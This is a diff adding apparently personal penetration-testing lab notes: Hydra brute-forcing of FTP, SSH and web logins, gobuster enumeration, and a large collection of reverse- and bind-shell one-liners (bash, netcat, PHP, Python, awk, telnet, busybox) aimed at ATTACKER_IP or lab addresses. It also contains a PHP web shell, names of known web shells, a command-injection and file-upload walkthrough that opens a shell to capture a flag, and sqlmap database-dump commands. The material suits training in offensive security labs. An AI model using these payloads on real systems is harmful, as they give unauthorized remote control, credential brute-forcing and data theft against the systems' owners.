@@ -1,0 +1,179 @@
+Hydra
+
+hydra -l user -P passlist.txt ftp://10.10.76.51
+hydra -l root -P password.txt 10.10.76.51 -t 4 ssh
+
+POST Web Form
+sudo hydra <username> <wordlist> 10.10.76.51 http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+sydo hydra -l <username> -P <wordlist> 10.10.76.51 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -l molly -P Desktop/Tools/wordlists/rockyou.txt 10.10.76.51 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -l molly -P Desktop/Tools/wordlists/rockyou.txt 10.10.76.51 -t 4 ssh -V
+
+Dirbuster
+
+Local network with DNS server
+nano /etc/resolv-dnsmasq
+nameserver <IP DNS server>
+CTRL+O - Enter - CTRL+X
+/etc/init.d/dnsmasq restart
+
+Enumerate a web directory
+gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64 -r
+gobuster dir -u "http://www.example.thm/secret" -w /usr/share/wordlists/dirb/small.txt -r -x .js
+
+Enumerate subdomains
+gobuster dns -d offesivetools.thm -w /usr/share/wordlists/SecList/Discovery/DNS/subdomains-top1million-5000.txt
+
+Enumerate VHOSTS
+gobuster vhost -u "http://10.10.21.3" --domain offensivetools.thm -w /usr/share/wordlists/SecList/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320
+
+
+SHELLS OVERVIEW
+
+Reverse SHELL
+nc -lvnp 4444
+pipe reverse shell> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc Attacker_ip Attacker_port >/tmp/f
+Explanation of the Payload
+
+    rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+    mkfifo /tmp/f - This command creates a named pipe, or FIFO (first-in, first-out), at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+    cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+    | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring that error messages are sent back to the attacker.
+    | nc ATTACKER_IP ATTACKER_PORT >/tmp/f - This part pipes the shell's output through nc (Netcat) to the attacker's IP address (ATTACKER_IP) on the attacker's port (ATTACKER_PORT).
+    >/tmp/f -This final part sends the output of the commands back into the named pipe, allowing for bi-directional communication.
+
+Bind SHELL
+pipe bind shell> rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
+Explanation of the Payload
+
+    rm -f /tmp/f - This command removes any existing named pipe file located at /tmp/f/. This ensures that the script can create a new named pipe without conflicts.
+    mkfifo /tmp/f - This command creates a named pipe, or FIFO, at /tmp/f. Named pipes allow for two-way communication between processes. In this context, it acts as a conduit for input and output.
+    cat /tmp/f - This command reads data from the named pipe. It waits for input that can be sent through the pipe.
+    | bash -i 2>&1 - The output of cat is piped to a shell instance (bash -i), which allows the attacker to execute commands interactively. The 2>&1 redirects standard error to standard output, ensuring error messages are returned to the attacker.
+    | nc -l 0.0.0.0 8080 - Starts Netcat in listen mode (-l) on all interfaces (0.0.0.0) and port 8080. The shell will be exposed to the attacker once they connect to this port.
+    >/tmp/f This final part sends the commands' output back into the named pipe, allowing for bidirectional communication.
+
+ports under value of 1024 require netcat to run with privilege permissions
+
+SHELL LISTENERS
+
+RLWRAP
+>rlwrap nc -lvnp 443
+- wraps nc with rlwrap, allowing the use of features like arrow keys and history
+
+NCAT
+>ncat -lvnp 4444 - improved version of nc distributed by NMAP project (extra features like encryption - SSL)
+>ncat --ssl -lvnp 4444 - --ssl enables SSL encryption for listener
+
+SOCAT
+allows you to create a socket connection between 2 data sources
+>socat -d -d TCP-LISTEN:443 STDOUT (-d enable verbose mode)
+
+SHELL PAYLOADS
+
+BASH
+Normal Bash reverse Shell
+>bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+
+Bash Read Line Reverse Shell
+>exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done (5 is the new file descriptor creates by the shell)
+
+Bash with file descriptor 196 reverse shell
+>0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+
+Bash with file descriptor 5 reverse shell
+>bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+
+
+PHP
+PHP reverse shell using the exec function - execute a shell, redirecting standard input and output
+>php -r '$sock=fsockopen("ATTACKER_IP", 443);exec("sh <&3 >&3 2>&3");'
+
+PHP reverse shell using the shell_exec function - similar to previous
+>php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+
+PHP reverse shell using the system function - executes the command and output the result to the browser
+>php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+
+PHP reverse shell using the passthru function - executes a command and sends raw output back to the browser
+>php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+
+PHP reverse shell using the popen function - open a process file pointer, allowing the shell to be executed
+>php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+
+PYTHON
+Pythhon reverse shell by exporting environments variables
+>export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.
+
+Python reverse shell using the subprocess Module
+>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
+This reverse shell uses the subprocess module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.
+
+SHORT python revesre shell
+>python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in (0,1,2)];pty.spawn("bash")'
+
+OTHERS
+
+TELNET
+>TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
+This reverse shell creates a named pipe using mkfifo and connects to the attacker via Telnet on IP ATTACKER_IP and port 443. 
+
+AWK
+>awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+This reverse shell uses AWK’s built-in TCP capabilities to connect to ATTACKER_IP:443. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.
+
+BUSYBOX
+>busybox nc ATTACKER_IP 443 -e sh
+This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
+
+WEB SHELLS
+Example PHP WEB SHELL
+<?php
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+}
+?>
+saved as shell.php
+
+http://victim.com/uploads/shell.php?cmd=whoami
+
+Existing Web Shells Available Online
+p0wny-shell
+b374k shell
+c99 shell
+https://www.r57shell.net/index.php
+
+10.10.66.36:8080 - landing page
+8081 - command injection
+8082 - unrestricted file upload
+
+What is the content of flag file in / directory? - command injection vuln
+
+>nc -lnvp 1550
+http://10.10.66.36:8081
+flag.txt ; rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.202.25 1550 >/tmp/f
+cd /
+cat flag.txt
+
+What is the content of flag file in / directory? - unrestricted file upload vuln
+
+http://10.10.66.36:8002
+curl https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php -s -o shell.php
+upload this file to the site
+navigate to http://10.10.66.36:8002/uploads/shell.php
+cd /
+cat flag.txt
+
+
+SQLMAP
+' OR 1=1;-- -
+sqlmap --wizard
+sqlmap -u http://sqlmaptesting.thm/search/cat=1
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T Thomas --dump
+sqlmap -r intercepted_request.txt
